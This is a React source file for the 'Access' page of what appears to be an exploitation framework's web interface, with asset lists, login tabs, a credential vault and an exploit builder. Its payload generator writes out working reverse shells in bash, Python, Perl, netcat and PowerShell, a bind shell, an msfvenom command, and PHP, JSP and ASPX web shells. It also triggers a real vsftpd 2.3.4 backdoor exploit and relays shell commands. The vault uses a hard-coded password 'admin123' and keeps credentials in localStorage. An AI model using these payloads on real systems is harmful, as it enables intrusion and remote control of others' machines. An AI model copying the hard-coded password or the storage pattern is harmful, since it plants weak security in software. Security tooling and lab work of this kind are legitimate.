import React, { useState, useEffect, useRef } from 'react';
import { useLocation } from 'react-router-dom';
import { useAccessStore, Protocol } from '../store/accessStore';
import { useExploitStore, ShellSession } from '../store/exploitStore';
import { useAuthStore } from '../store/authStore';
import { assetService, Asset } from '../services/assetService';
import { Vulnerability } from '../store/scanStore';
import ProtocolConnection from '../components/ProtocolConnection';
import { CyberPageTitle } from '../components/CyberUI';

type AccessMode = 'login' | 'exploit';

const Access: React.FC = () => {
  const { token } = useAuthStore();
  const location = useLocation();
  const { tabs, activeTabId, setActiveTab, removeTab, addTab, updateTabStatus } = useAccessStore();
  const { 
    sessions: shellSessions, 
    activeSessionId, 
    addSession, 
    removeSession, 
    setActiveSession, 
    updateSessionStatus,
    incrementCommandCount
  } = useExploitStore();
  
  // Asset state
  const [assets, setAssets] = useState<Asset[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedAsset, setSelectedAsset] = useState<Asset | null>(null);
  
  // Filtering
  const [assetFilter, setAssetFilter] = useState<'all' | 'scanned' | 'vulnerable'>(() => {
    const saved = localStorage.getItem('access_assetFilter');
    return (saved as 'all' | 'scanned' | 'vulnerable') || 'all';
  });
  const [ipFilter, setIpFilter] = useState(() => localStorage.getItem('access_ipFilter') || '');
  const [manualIP, setManualIP] = useState('');
  const [showManualIPInput, setShowManualIPInput] = useState(false);
  
  // Mode state
  const [accessMode, setAccessMode] = useState<AccessMode>(() => {
    const saved = localStorage.getItem('access_mode');
    return (saved as AccessMode) || 'login';
  });
  
  // Login mode state
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [selectedProtocol, setSelectedProtocol] = useState<Protocol>('ssh');
  const [selectedService, setSelectedService] = useState<{port: string, service: string} | null>(null);
  const [loginCredentials, setLoginCredentials] = useState({ username: '', password: '' });
  
  // Vault state
  const [showVault, setShowVault] = useState(false);
  const [vaultPassword, setVaultPassword] = useState('');
  const [isVaultUnlocked, setIsVaultUnlocked] = useState(false);
  const [vaultSortBy, setVaultSortBy] = useState<'recent' | 'frequent' | 'name'>('recent');
  const [vaultCredentialsRaw, setVaultCredentialsRaw] = useState<Array<{
    id: number;
    host: string;
    hostname?: string;
    protocol: string;
    username: string;
    lastUsed: string;
    useCount: number;
    lastUsedTimestamp: number;
  }>>([]);
  const [hoveredCredId, setHoveredCredId] = useState<number | null>(null);
  
  // Exploit mode state
  const [showExploitBuilder, setShowExploitBuilder] = useState(false);
  const [exploitName, setExploitName] = useState('');
  const [exploitDescription, setExploitDescription] = useState('');
  const [payloadType, setPayloadType] = useState<'reverse_shell' | 'bind_shell' | 'meterpreter' | 'web_shell' | 'custom'>('reverse_shell');
  const [payloadVariant, setPayloadVariant] = useState<'bash' | 'python' | 'perl' | 'netcat' | 'powershell' | 'php' | 'jsp' | 'aspx'>('bash');
  const [targetService, setTargetService] = useState('');
  const [targetPort, setTargetPort] = useState('');
  const [listenerIP, setListenerIP] = useState('');
  const [listenerPort, setListenerPort] = useState('4444');
  const [customPayload, setCustomPayload] = useState('');
  const [selectedVulnerability, setSelectedVulnerability] = useState<Vulnerability | null>(null);
  
  // Shell console state
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState<string[]>([]);
  const terminalEndRef = useRef<HTMLDivElement>(null);
  
  // View state
  const [showConsole, setShowConsole] = useState(false);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [connectionHeight, setConnectionHeight] = useState(600);
  const [isResizing, setIsResizing] = useState(false);

  const activeTab = tabs.find(t => t.id === activeTabId);

  useEffect(() => {
    localStorage.setItem('access_assetFilter', assetFilter);
  }, [assetFilter]);

  useEffect(() => {
    localStorage.setItem('access_ipFilter', ipFilter);
  }, [ipFilter]);

  useEffect(() => {
    localStorage.setItem('access_mode', accessMode);
  }, [accessMode]);

  useEffect(() => {
    fetchAllAssets();
  }, []);

  useEffect(() => {
    // Refresh assets when token changes
    if (token) {
      fetchAllAssets();
    }
  }, [token]);

  // Handle navigation from Scans page with state
  useEffect(() => {
    const state = location.state as any;
    if (state) {
      // Set mode if provided
      if (state.mode === 'exploit' || state.mode === 'login') {
        setAccessMode(state.mode);
        if (state.mode === 'exploit') {
          setShowExploitBuilder(true);
          setShowConsole(true);
        }
      }
      
      // Set target IP if provided
      if (state.targetIP) {
        // Find or create asset for this IP
        const existingAsset = assets.find(a => a.ip_address === state.targetIP);
        if (existingAsset) {
          setSelectedAsset(existingAsset);
        } else {
          // Create manual asset
          const manualAsset: Asset = {
            id: `manual-${Date.now()}`,
            ip_address: state.targetIP,
            hostname: undefined,
            asset_type: 'unknown',
            status: 'unknown',
            last_seen: new Date().toISOString(),
            discovery_method: 'manual',
            open_ports: []
          };
          setAssets(prev => [...prev, manualAsset]);
          setSelectedAsset(manualAsset);
        }
      }
      
      // Set vulnerability if provided (for exploit mode)
      if (state.vulnerability) {
        setSelectedVulnerability(state.vulnerability);
        
        // Auto-populate exploit builder form fields
        const vuln = state.vulnerability;
        
        // Set exploit name and description
        setExploitName(vuln.cve_id ? `Exploit for ${vuln.cve_id}` : vuln.title || 'Custom Exploit');
        setExploitDescription(vuln.description || '');
        
        // Use exploit-specific metadata if available
        if (vuln.exploit_data) {
          const exploit = vuln.exploit_data;
          const metadata = exploit.exploit_metadata;
          
          // Priority 1: Use exploit_metadata if available (most specific)
          if (metadata) {
            // Set port based on metadata
            if (metadata.shell_port) {
              setTargetPort(metadata.shell_port.toString());
            } else if (metadata.trigger_port) {
              setTargetPort(metadata.trigger_port.toString());
            } else {
              setTargetPort(vuln.affected_port?.toString() || '');
            }
            
            // Set service description
            setTargetService(vuln.affected_service || exploit.title || '');
            
            // Set payload type based on metadata shell_type
            if (metadata.shell_type === 'bind_shell') {
              setPayloadType('bind_shell');
            } else if (metadata.shell_type === 'reverse_shell') {
              setPayloadType('reverse_shell');
            } else if (metadata.payload_type?.includes('web')) {
              setPayloadType('web_shell');
            } else if (metadata.payload_type?.includes('meterpreter')) {
              setPayloadType('meterpreter');
            } else {
              setPayloadType('reverse_shell'); // default
            }
            
            // Set payload variant based on metadata
            if (metadata.default_payload_variant) {
              setPayloadVariant(metadata.default_payload_variant);
            } else if (exploit.target_platform?.toLowerCase().includes('windows')) {
              setPayloadVariant('powershell');
            } else {
              setPayloadVariant('bash');
            }
          }
          // Priority 2: Use exploit module info (less specific)
          else {
            const moduleId = exploit.module_id?.toLowerCase() || '';
            const exploitType = exploit.exploit_type?.toLowerCase() || '';
            const platform = exploit.target_platform?.toLowerCase() || '';
            
            // VSFTPD 2.3.4 Backdoor (CVE-2011-2523) fallback
            if (moduleId.includes('vsftpd') || vuln.cve_id === 'CVE-2011-2523') {
              setTargetPort('6200'); // Backdoor shell port
              setTargetService('vsftpd backdoor shell');
              setPayloadType('bind_shell');
              setPayloadVariant('bash');
            }
            // Generic exploit-based configuration
            else {
              setTargetPort(vuln.affected_port?.toString() || '');
              setTargetService(vuln.affected_service || '');
              
              // Determine payload type based on exploit metadata
              if (exploitType.includes('remote') || exploitType.includes('webapps')) {
                if (platform.includes('windows')) {
                  setPayloadType('reverse_shell');
                  setPayloadVariant('powershell');
                } else if (platform.includes('php') || vuln.affected_service?.toLowerCase().includes('http')) {
                  setPayloadType('web_shell');
                  setPayloadVariant('php');
                } else {
                  setPayloadType('reverse_shell');
                  setPayloadVariant('bash');
                }
              } else if (exploitType.includes('local')) {
                setPayloadType('bind_shell');
                setPayloadVariant(platform.includes('windows') ? 'powershell' : 'bash');
              } else {
                if (platform.includes('windows')) {
                  setPayloadType('reverse_shell');
                  setPayloadVariant('powershell');
                } else {
                  setPayloadType('reverse_shell');
                  setPayloadVariant('bash');
                }
              }
            }
          }
        } else {
          // Fallback to generic service-based inference (old behavior)
          setTargetPort(vuln.affected_port?.toString() || '');
          setTargetService(vuln.affected_service || '');
          
          const service = vuln.affected_service?.toLowerCase() || '';
          if (service.includes('ssh') || service.includes('telnet') || service.includes('ftp')) {
            setPayloadType('reverse_shell');
            setPayloadVariant('bash');
          } else if (service.includes('http') || service.includes('web') || service.includes('apache') || service.includes('nginx')) {
            setPayloadType('web_shell');
            setPayloadVariant('php');
          } else if (service.includes('smb') || service.includes('rdp') || service.includes('windows')) {
            setPayloadType('reverse_shell');
            setPayloadVariant('powershell');
          } else if (service.includes('mysql') || service.includes('postgres') || service.includes('mssql')) {
            setPayloadType('reverse_shell');
            setPayloadVariant('python');
          } else {
            setPayloadType('reverse_shell');
            setPayloadVariant('bash');
          }
        }
      }
    }
  }, [location.state, assets]);

  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [output]);

  // Handle navigation state from Scans page
  useEffect(() => {
    const state = location.state as any;
    if (state) {
      if (state.mode) {
        setAccessMode(state.mode);
        if (state.mode === 'exploit') {
          setShowExploitBuilder(true);
          setShowConsole(true);
        }
      }
      if (state.vulnerability) {
        setSelectedVulnerability(state.vulnerability);
      }
      if (state.targetIP) {
        // Try to find and select the asset with this IP
        const asset = assets.find(a => a.ip_address === state.targetIP);
        if (asset) {
          setSelectedAsset(asset);
        } else {
          // Create a manual asset entry
          const newAsset: Asset = {
            id: `manual-${Date.now()}`,
            ip_address: state.targetIP,
            hostname: undefined,
            asset_type: 'unknown',
            status: 'unknown',
            last_seen: new Date().toISOString(),
            discovery_method: 'manual',
            open_ports: []
          };
          setAssets(prev => [...prev, newAsset]);
          setSelectedAsset(newAsset);
        }
      }
    }
  }, [location.state, assets]);

  // Load vault credentials from localStorage
  useEffect(() => {
    const stored = localStorage.getItem('vaultCredentials');
    if (stored) {
      try {
        setVaultCredentialsRaw(JSON.parse(stored));
      } catch (e) {
        console.error('Failed to load vault credentials', e);
      }
    }
  }, []);

  // Save vault credentials to localStorage
  useEffect(() => {
    if (vaultCredentialsRaw.length > 0) {
      localStorage.setItem('vaultCredentials', JSON.stringify(vaultCredentialsRaw));
    }
  }, [vaultCredentialsRaw]);

  const fetchAllAssets = async () => {
    setLoading(true);
    try {
      const authToken = token || localStorage.getItem('token') || '';
      if (!authToken) {
        console.warn('No auth token available');
        setLoading(false);
        return;
      }
      const allAssets = await assetService.getAssets(authToken);
      console.log('Fetched assets:', allAssets.length);
      setAssets(allAssets);
    } catch (error) {
      console.error('Failed to fetch assets:', error);
    } finally {
      setLoading(false);
    }
  };

  const getFilteredAssets = () => {
    let filtered = assets;
    
    if (assetFilter === 'scanned') {
      filtered = filtered.filter(asset => asset.open_ports && asset.open_ports.length > 0);
    } else if (assetFilter === 'vulnerable') {
      filtered = filtered.filter(asset => asset.vulnerable_count && asset.vulnerable_count > 0);
    }
    
    if (ipFilter.trim()) {
      filtered = filtered.filter(asset => 
        asset.ip_address.toLowerCase().includes(ipFilter.toLowerCase().trim()) ||
        (asset.hostname && asset.hostname.toLowerCase().includes(ipFilter.toLowerCase().trim()))
      );
    }
    
    return filtered;
  };

  const addManualIP = () => {
    if (!manualIP.trim()) return;
    
    const exists = assets.find(a => a.ip_address === manualIP.trim());
    if (exists) {
      setSelectedAsset(exists);
      setManualIP('');
      setShowManualIPInput(false);
      return;
    }
    
    const newAsset: Asset = {
      id: `manual-${Date.now()}`,
      ip_address: manualIP.trim(),
      hostname: undefined,
      asset_type: 'unknown',
      status: 'unknown',
      last_seen: new Date().toISOString(),
      discovery_method: 'manual',
      open_ports: []
    };
    
    setAssets([newAsset, ...assets]);
    setSelectedAsset(newAsset);
    setManualIP('');
    setShowManualIPInput(false);
  };

  const handleAssetClick = (asset: Asset) => {
    setSelectedAsset(asset);
    
    if (accessMode === 'login') {
      // Determine available services
      const services = asset.services ? Object.entries(asset.services) : [];
      
      // Known protocols that we can auto-connect to
      const knownProtocols = ['ssh', 'rdp', 'vnc', 'telnet', 'ftp', 'http', 'https'];
      
      // Check if single service with known protocol
      if (services.length === 1) {
        const [port, serviceData] = services[0];
        const serviceName = serviceData.service?.toLowerCase() || '';
        
        if (knownProtocols.includes(serviceName)) {
          // Single known service - auto-connect directly
          const protocol = mapServiceToProtocol(serviceData.service);
          
          // Auto-connect without showing modal
          addTab(asset.ip_address, protocol, asset.hostname);
          
          // Save to vault
          const existingIndex = vaultCredentialsRaw.findIndex(
            cred => cred.host === asset.ip_address && cred.protocol === protocol
          );
          
          if (existingIndex >= 0) {
            const updated = [...vaultCredentialsRaw];
            updated[existingIndex] = {
              ...updated[existingIndex],
              lastUsed: new Date().toISOString(),
              useCount: updated[existingIndex].useCount + 1,
              lastUsedTimestamp: Date.now()
            };
            setVaultCredentialsRaw(updated);
          } else {
            setVaultCredentialsRaw([
              ...vaultCredentialsRaw,
              {
                id: Date.now(),
                host: asset.ip_address,
                hostname: asset.hostname,
                protocol,
                username: '',
                lastUsed: new Date().toISOString(),
                useCount: 1,
                lastUsedTimestamp: Date.now()
              }
            ]);
          }
        } else {
          // Single service but unknown protocol - show modal for protocol selection
          setSelectedService({ port, service: serviceData.service || 'unknown' });
          setSelectedProtocol('ssh');
          setShowLoginModal(true);
        }
      } else {
        // Multiple services OR no services - show selection modal
        setSelectedService(null);
        setSelectedProtocol('ssh');
        setShowLoginModal(true);
      }
    } else if (accessMode === 'exploit') {
      // Show exploit builder
      setShowExploitBuilder(true);
      setShowConsole(true);
    }
  };

  const mapServiceToProtocol = (service: string | undefined | null): Protocol => {
    if (!service) return 'ssh';
    const serviceMap: { [key: string]: Protocol } = {
      'ssh': 'ssh',
      'rdp': 'rdp',
      'vnc': 'vnc',
      'telnet': 'telnet',
      'ftp': 'ftp',
      'http': 'web',
      'https': 'web'
    };
    return serviceMap[service.toLowerCase()] || 'ssh';
  };

  const handleLogin = () => {
    if (!selectedAsset) return;
    
    addTab(selectedAsset.ip_address, selectedProtocol, selectedAsset.hostname);
    
    // Add to vault credentials
    const existingIndex = vaultCredentialsRaw.findIndex(
      cred => cred.host === selectedAsset.ip_address && cred.protocol === selectedProtocol
    );
    
    if (existingIndex >= 0) {
      const updated = [...vaultCredentialsRaw];
      updated[existingIndex] = {
        ...updated[existingIndex],
        lastUsed: 'Just now',
        lastUsedTimestamp: Date.now(),
        useCount: updated[existingIndex].useCount + 1,
      };
      setVaultCredentialsRaw(updated);
    } else {
      const newCred = {
        id: Date.now(),
        host: selectedAsset.ip_address,
        hostname: selectedAsset.hostname,
        protocol: selectedProtocol,
        username: loginCredentials.username || 'user',
        lastUsed: 'Just now',
        useCount: 1,
        lastUsedTimestamp: Date.now(),
      };
      setVaultCredentialsRaw([...vaultCredentialsRaw, newCred]);
    }
    
    setShowLoginModal(false);
    setLoginCredentials({ username: '', password: '' });
    setSelectedService(null);
  };

  const handleVaultUnlock = () => {
    if (vaultPassword === 'admin123') {
      setIsVaultUnlocked(true);
      setVaultPassword('');
    } else {
      alert('Invalid password');
    }
  };

  const handleVaultLock = () => {
    setIsVaultUnlocked(false);
  };

  const handleRemoveCredential = (id: number) => {
    if (window.confirm('Remove this credential from vault?')) {
      setVaultCredentialsRaw(vaultCredentialsRaw.filter(cred => cred.id !== id));
    }
  };

  const handleQuickConnect = (host: string, protocol: Protocol, hostname?: string) => {
    addTab(host, protocol, hostname);
    
    // Update usage stats
    const existingIndex = vaultCredentialsRaw.findIndex(
      cred => cred.host === host && cred.protocol === protocol
    );
    
    if (existingIndex >= 0) {
      const updated = [...vaultCredentialsRaw];
      updated[existingIndex] = {
        ...updated[existingIndex],
        lastUsed: 'Just now',
        lastUsedTimestamp: Date.now(),
        useCount: updated[existingIndex].useCount + 1,
      };
      setVaultCredentialsRaw(updated);
    }
  };

  const getProtocolColor = (protocol: string) => {
    switch(protocol) {
      case 'ssh': return 'text-cyber-green border-cyber-green';
      case 'vnc': return 'text-cyber-purple border-cyber-purple';
      case 'rdp': return 'text-cyber-blue border-cyber-blue';
      case 'ftp': return 'text-yellow-500 border-yellow-500';
      case 'web': return 'text-cyber-blue border-cyber-blue';
      default: return 'text-cyber-gray border-cyber-gray';
    }
  };

  // Sort vault credentials
  const vaultCredentials = [...vaultCredentialsRaw].sort((a, b) => {
    switch(vaultSortBy) {
      case 'recent':
        return b.lastUsedTimestamp - a.lastUsedTimestamp;
      case 'frequent':
        return b.useCount - a.useCount;
      case 'name':
        return (a.hostname || a.host).localeCompare(b.hostname || b.host);
      default:
        return 0;
    }
  });

  const toggleFullscreen = () => {
    setIsFullscreen(!isFullscreen);
  };

  const generatePayload = () => {
    let payload = '';
    
    if (payloadType === 'custom') {
      return customPayload;
    }
    
    if (payloadType === 'reverse_shell') {
      switch (payloadVariant) {
        case 'bash':
          payload = `bash -i >& /dev/tcp/${listenerIP}/${listenerPort} 0>&1`;
          break;
        case 'python':
          payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${listenerIP}",${listenerPort}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
          break;
        case 'perl':
          payload = `perl -e 'use Socket;$i="${listenerIP}";$p=${listenerPort};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
          break;
        case 'netcat':
          payload = `nc -e /bin/sh ${listenerIP} ${listenerPort}`;
          break;
        case 'powershell':
          payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${listenerIP}",${listenerPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
          break;
      }
    } else if (payloadType === 'bind_shell') {
      payload = `nc -lvp ${listenerPort} -e /bin/bash`;
    } else if (payloadType === 'meterpreter') {
      payload = `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${listenerIP} LPORT=${listenerPort} -f elf > payload.elf`;
    } else if (payloadType === 'web_shell') {
      switch (payloadVariant) {
        case 'php':
          payload = `<?php system($_GET['cmd']); ?>`;
          break;
        case 'jsp':
          payload = `<%@ page import="java.io.*" %>\n<% String cmd = request.getParameter("cmd");\n   Process p = Runtime.getRuntime().exec(cmd);\n   OutputStream os = p.getOutputStream();\n   InputStream in = p.getInputStream(); %>`;
          break;
        case 'aspx':
          payload = `<%@ Page Language="C#" %>\n<% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd()); %>`;
          break;
      }
    }
    
    return payload;
  };

  const handleBuildExploit = () => {
    const payload = generatePayload();
    const vulnInfo = selectedVulnerability 
      ? [`[*] Target Vulnerability: ${selectedVulnerability.cve_id}`, `[*] CVSS Score: ${selectedVulnerability.cvss_score}/10`]
      : [];
    
    setOutput([
      '[+] Exploit Module Built Successfully',
      `[*] Name: ${exploitName}`,
      `[*] Target: ${selectedAsset?.ip_address || 'Not selected'}`,
      ...vulnInfo,
      `[*] Payload Type: ${payloadType}${payloadVariant ? ` (${payloadVariant})` : ''}`,
      `[*] Generated Payload:`,
      payload,
      '[!] Ready to execute.'
    ]);
  };

  const handleExecutePayload = async () => {
    if (!selectedAsset) {
      setOutput(prev => [...prev, '[!] ERROR: No target selected']);
      return;
    }

    const newSession: ShellSession = {
      id: Math.random().toString(36).substring(7),
      target_ip: selectedAsset.ip_address,
      target_port: parseInt(targetPort) || 4444,
      status: 'connecting',
      type: payloadType === 'reverse_shell' ? 'reverse' : 'bind',
      created_at: new Date(),
      commands_executed: 0,
      uptime: 0
    };

    addSession(newSession);
    
    const vulnInfo = selectedVulnerability 
      ? [`[*] Exploiting vulnerability: ${selectedVulnerability.cve_id}`]
      : [];
    
    setOutput(prev => [
      ...prev,
      `[*] Initializing ${payloadType} to ${selectedAsset.ip_address}:${targetPort}`,
      ...vulnInfo,
      '[*] Setting up listener...',
      '[*] Sending exploit payload...',
      '[*] Waiting for connection...'
    ]);

    // Real exploit execution for vsftpd backdoor
    if (selectedVulnerability?.cve_id === 'CVE-2011-2523' || targetService.toLowerCase().includes('vsftpd')) {
      try {
        const response = await fetch('/api/v1/vulnerabilities/exploit/execute', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
          },
          body: JSON.stringify({
            target_ip: selectedAsset.ip_address,
            target_port: 21, // FTP port to trigger backdoor
            exploit_type: 'vsftpd_backdoor'
          })
        });

        const result = await response.json();

        if (result.success) {
          updateSessionStatus(newSession.id, 'connected');
          setOutput(prev => [
            ...prev,
            `[+] Exploit successful!`,
            `[+] Shell session ${newSession.id} opened on port ${result.shell_port}`,
            `[+] Connected to ${selectedAsset.ip_address}`,
            `[*] Initial output:`,
            result.output,
            `[*] You now have root shell access. Type commands below...`
          ]);
        } else {
          updateSessionStatus(newSession.id, 'failed');
          setOutput(prev => [
            ...prev,
            `[-] Exploit failed: ${result.output}`,
            `[*] Try verifying the target is vulnerable`
          ]);
        }
      } catch (error: any) {
        updateSessionStatus(newSession.id, 'failed');
        setOutput(prev => [
          ...prev,
          `[-] Connection error: ${error.message}`,
          `[*] Check that the target is reachable and the backend is running`
        ]);
      }
    } else {
      // Simulated mode for other exploits
      setTimeout(() => {
        updateSessionStatus(newSession.id, 'connected');
        setOutput(prev => [
          ...prev,
          `[+] Exploit successful!`,
          `[+] Shell session ${newSession.id} opened`,
          `[+] Connected to ${selectedAsset.ip_address}`,
          `[*] You now have ${payloadType === 'bind_shell' ? 'bind' : 'reverse'} shell access`,
          `[*] Type commands below...`
        ]);
      }, 2000);
    }
  };

  const handleSendCommand = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!command.trim() || !activeSessionId) return;

    const currentCommand = command;
    const session = shellSessions.find(s => s.id === activeSessionId);
    if (session) {
      incrementCommandCount(activeSessionId);
    }
    
    setCommand('');
    setOutput(prev => [...prev, `root@${selectedAsset?.hostname || selectedAsset?.ip_address}:~# ${currentCommand}`]);

    // Real command execution for vsftpd backdoor
    if (selectedVulnerability?.cve_id === 'CVE-2011-2523' || targetService.toLowerCase().includes('vsftpd')) {
      try {
        const response = await fetch('/api/v1/vulnerabilities/exploit/execute', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
          },
          body: JSON.stringify({
            target_ip: selectedAsset?.ip_address,
            target_port: 21,
            exploit_type: 'shell_command',
            command: currentCommand
          })
        });

        const result = await response.json();
        if (result.success) {
          setOutput(prev => [...prev, result.output]);
        } else {
          setOutput(prev => [...prev, `Error: ${result.output}`]);
        }
      } catch (error: any) {
        setOutput(prev => [...prev, `Error: ${error.message}`]);
      }
    } else {
      // Simulated mode for other exploits
      setTimeout(() => {
        let response = '';
        if (currentCommand === 'whoami') {
          response = 'root';
        } else if (currentCommand === 'pwd') {
          response = '/root';
        } else if (currentCommand.startsWith('ls')) {
          response = 'Desktop\nDocuments\nDownloads\nflag.txt\nexploit.sh';
        } else if (currentCommand === 'id') {
          response = 'uid=0(root) gid=0(root) groups=0(root)';
        } else if (currentCommand === 'uname -a') {
          response = 'Linux target 5.15.0-56-generic #62-Ubuntu SMP x86_64 GNU/Linux';
        } else if (currentCommand.startsWith('cat flag.txt')) {
          response = 'FLAG{pwn3d_by_exploit_framework}';
        } else if (currentCommand === 'ifconfig' || currentCommand === 'ip a') {
          response = `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet ${selectedAsset?.ip_address}  netmask 255.255.255.0  broadcast 192.168.1.255`;
        } else {
          response = `[*] Command executed: ${currentCommand}`;
        }
        setOutput(prev => [...prev, response]);
      }, 500);
    }
  };

  const handleCloseSession = (sessionId: string) => {
    removeSession(sessionId);
    setOutput(prev => [...prev, `[*] Session ${sessionId} closed`]);
  };

  const getServiceIcon = (service: string) => {
    const icons: { [key: string]: string } = {
      'ssh': '◈',
      'http': '◉',
      'https': '◉',
      'ftp': '◉',
      'telnet': '◆',
      'rdp': '◉',
      'vnc': '◉',
      'mysql': '◉',
      'postgresql': '◉',
      'smb': '◆'
    };
    return icons[service.toLowerCase()] || '◈';
  };

  const getSeverityColor = (severity: string) => {
    const colors = {
      'critical': 'border-red-600 text-red-500 bg-red-500',
      'high': 'border-orange-500 text-orange-400 bg-orange-500',
      'medium': 'border-yellow-500 text-yellow-400 bg-yellow-500',
      'low': 'border-blue-500 text-blue-400 bg-blue-500'
    };
    return colors[severity as keyof typeof colors] || colors.low;
  };

  const handleMouseDown = (e: React.MouseEvent) => {
    setIsResizing(true);
    e.preventDefault();
  };

  const handleMouseMove = (e: MouseEvent) => {
    if (isResizing) {
      const newHeight = window.innerHeight - e.clientY - 100;
      if (newHeight >= 300 && newHeight <= window.innerHeight - 200) {
        setConnectionHeight(newHeight);
      }
    }
  };

  const handleMouseUp = () => {
    setIsResizing(false);
  };

  useEffect(() => {
    if (isResizing) {
      document.addEventListener('mousemove', handleMouseMove);
      document.addEventListener('mouseup', handleMouseUp);
    } else {
      document.removeEventListener('mousemove', handleMouseMove);
      document.removeEventListener('mouseup', handleMouseUp);
    }
    return () => {
      document.removeEventListener('mousemove', handleMouseMove);
      document.removeEventListener('mouseup', handleMouseUp);
    };
  }, [isResizing]);

  return (
    <div className="h-full flex gap-4">
      <div className="flex-1 flex flex-col space-y-4">
        {/* Header */}
        <div className="flex justify-between items-center">
          <div>
            <CyberPageTitle color="red" className="flex items-center">
              <span className="mr-3 text-3xl">◆</span>
              Access Control
            </CyberPageTitle>
            <p className="text-cyber-gray-light text-sm mt-1">Connect to assets via login or exploit vulnerabilities</p>
          </div>
          
          {/* Mode Selection */}
          <div className="flex space-x-2">
            <button
              key="login-mode-btn"
              type="button"
              onClick={() => setAccessMode('login')}
              className={`btn-cyber px-6 py-2 font-bold uppercase tracking-wide transition-all duration-200 ${
                accessMode === 'login' 
                  ? 'btn-cyber-active-green' 
                  : 'hover:border-cyber-green hover:text-cyber-green'
              }`}
            >
              <span className="text-lg mr-2">◉</span> LOGIN
            </button>
            <button
              key="exploit-mode-btn"
              type="button"
              onClick={() => setAccessMode('exploit')}
              className={`btn-cyber px-6 py-2 font-bold uppercase tracking-wide transition-all duration-200 ${
                accessMode === 'exploit' 
                  ? 'btn-cyber-active-red' 
                  : 'hover:border-cyber-red hover:text-cyber-red'
              }`}
            >
              <span className="text-lg mr-2">◆</span> EXPLOIT
            </button>
            <button
              key="vault-btn"
              type="button"
              onClick={() => setShowVault(!showVault)}
              className={`btn-cyber px-6 py-2 font-bold uppercase tracking-wide transition-all duration-200 ${
                showVault 
                  ? 'btn-cyber-active-purple' 
                  : 'hover:border-cyber-purple hover:text-cyber-purple'
              }`}
            >
              <span className="text-lg mr-2">◈</span> VAULT
            </button>
          </div>
        </div>

        {/* Main Content Area */}
        <div className="flex-1 flex gap-4 overflow-hidden">
          {/* Left Side - Asset List */}
          <div className="w-1/3 bg-cyber-darker border border-cyber-gray rounded-lg flex flex-col overflow-hidden">
          <div className="p-4 border-b border-cyber-gray bg-cyber-dark">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-cyber-blue font-bold uppercase text-sm flex items-center">
                <span className="mr-2">◈</span>
                Assets ({getFilteredAssets().length})
              </h3>
              <div className="flex space-x-2">
                <button
                  onClick={() => setAssetFilter('all')}
                  className={`btn-base btn-sm ${assetFilter === 'all' ? 'btn-blue' : 'btn-gray'}`}
                >
                  All
                </button>
                <button
                  onClick={() => setAssetFilter('scanned')}
                  className={`btn-base btn-sm ${assetFilter === 'scanned' ? 'btn-green' : 'btn-gray'}`}
                >
                  Scanned
                </button>
                <button
                  onClick={() => setAssetFilter('vulnerable')}
                  className={`btn-base btn-sm ${assetFilter === 'vulnerable' ? 'btn-red' : 'btn-gray'}`}
                >
                  Vulnerable
                </button>
              </div>
            </div>
            
            <div className="flex items-center space-x-2">
              <div className="flex-1 relative">
                <input
                  type="text"
                  name="nop-ip-filter"
                  autoComplete="off"
                  value={ipFilter}
                  onChange={(e) => setIpFilter(e.target.value)}
                  placeholder="Filter by IP or hostname..."
                  className="w-full px-3 py-2 bg-cyber-darker border border-cyber-gray rounded text-white text-sm focus:outline-none focus:border-cyber-blue placeholder-cyber-gray font-mono"
                />
                {ipFilter && (
                  <button
                    onClick={() => setIpFilter('')}
                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cyber-gray hover:text-cyber-red"
                  >
                    ✕
                  </button>
                )}
              </div>
              <button
                onClick={() => setShowManualIPInput(!showManualIPInput)}
                className="btn-cyber border-cyber-purple text-cyber-purple hover:bg-cyber-purple hover:text-black px-4 py-2 text-sm font-bold whitespace-nowrap"
              >
                ⊞ Add
              </button>
            </div>

            {showManualIPInput && (
              <div className="mt-3 p-3 bg-cyber-darker border border-cyber-purple rounded">
                <div className="flex items-center space-x-2">
                  <input
                    type="text"
                    name="nop-manual-ip"
                    autoComplete="off"
                    value={manualIP}
                    onChange={(e) => setManualIP(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && addManualIP()}
                    placeholder="e.g., 172.21.0.42"
                    className="flex-1 px-3 py-2 bg-cyber-dark border border-cyber-gray rounded text-white text-sm focus:outline-none focus:border-cyber-purple placeholder-cyber-gray font-mono"
                    autoFocus
                  />
                  <button
                    onClick={addManualIP}
                    className="btn-cyber border-cyber-green text-cyber-green hover:bg-cyber-green hover:text-black px-4 py-2 text-sm font-bold"
                  >
                    Add
                  </button>
                </div>
              </div>
            )}
          </div>
          
          <div className="flex-1 overflow-auto">
            {loading ? (
              <div className="flex items-center justify-center h-full">
